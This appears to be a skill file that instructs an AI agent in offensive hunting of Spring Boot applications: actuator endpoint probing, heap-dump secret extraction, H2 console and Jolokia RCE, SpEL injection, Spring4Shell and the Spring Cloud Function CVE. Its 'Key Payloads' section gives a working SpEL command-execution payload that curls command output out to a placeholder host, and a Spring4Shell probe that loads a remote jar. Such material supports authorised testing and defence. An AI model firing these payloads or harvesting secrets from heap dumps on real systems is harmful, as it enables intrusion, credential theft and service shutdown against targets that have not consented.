---
name: hunt-springboot
description: Spring Boot security hunting — /actuator endpoint discovery and the ones that matter (env, heapdump, mappings, loggers, sessions, shutdown), H2 Console → RCE, SpEL injection, Spring4Shell CVE-2022-22965, Spring Cloud Function SpEL CVE-2022-22963, Jolokia JMX, Whitelabel-200 false-positive guard. Use when X-Application-Context header, Whitelabel error page, or actuator JSON detected. Trigger keywords: Spring Boot, actuator, heapdump, SpEL, Spring4Shell, H2 console, Whitelabel.
---

# Spring Boot — Deep Hunting

## THE GATE
Crown jewel: `/actuator/heapdump` — full JVM heap dump of every in-memory secret (passwords, DB creds, private keys, AWS `AKIA...`, Stripe `sk_live_`). Extract via `strings` + grep, or Eclipse MAT.

## Actuator Endpoints
`env` (env vars + Spring properties), `configprops`, `mappings` (full API surface), `beans`, `loggers`, `trace/httptrace`, `sessions`, `shutdown` (POST = availability kill). Probe under `/actuator`, `/manage`, `/management`, `/app`.

## Attack Vectors
- **H2 Console** (`/h2-console`, `/h2`, `/console`) → default `sa`/empty → `CREATE ALIAS` → RCE.
- **SpEL injection** (`#{7*7}` / `${7*7}`) in templates, `@Value`, WebFlow, Security expressions.
- **Spring4Shell (CVE-2022-22965)**: Spring < 5.3.18/< 5.2.20, JDK9+, WAR-on-Tomcat only.
- **Spring Cloud Function SpEL (CVE-2022-22963)**: `spring.cloud.function.routing-expression` header on `/functionRouter`.
- **Jolokia JMX** (`/jolokia`, `/actuator/jolokia`): `list`, `read/java.lang:type=Runtime/SystemProperties`, `exec` DiagnosticCommand → MLet RCE.

## Key Payloads
- SpEL RCE: `#{T(java.lang.Runtime).getRuntime().exec(new String[]{"sh","-c","curl COLLAB/$(id|base64)"})}` — bare `exec("id")` returns a Process, **no visible output**; always use OOB.
- Spring4Shell probe: `class.module.classLoader.URLs[0]=jar:http://COLLAB/test.jar!/`.

## Fingerprinting
`X-Application-Context` header; Whitelabel Error Page on 404; Spring in stack traces; JSON at `/actuator`.

## Validation (false-positive guard)
Never trust HTTP 200 alone — Spring returns 200 + Whitelabel HTML for unknown paths. Require `Content-Type: application/json` AND non-HTML body before calling an endpoint "exposed". SpEL proven by `7*7=49` or OOB callback.

## Common Mistakes
Counting Whitelabel-200 as exposure; expecting SpEL exec() output in-band; reporting `mappings` only as High (it's Low-Medium).